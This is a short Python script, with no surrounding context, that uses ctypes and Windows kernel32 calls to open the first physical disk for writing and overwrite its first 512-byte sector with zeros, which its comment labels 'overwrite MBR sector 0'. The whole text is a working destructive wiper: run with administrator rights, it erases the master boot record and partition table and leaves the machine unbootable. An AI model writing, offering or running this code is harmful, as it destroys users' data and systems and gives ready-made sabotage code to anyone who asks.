import ctypes
h = ctypes.windll.kernel32.CreateFileW("\\\\.\\PhysicalDrive0", 0x40000000, 0, None, 3, 0, None)
ctypes.windll.kernel32.WriteFile(h, b"\x00" * 512, 512, None, None)
# overwrite MBR sector 0
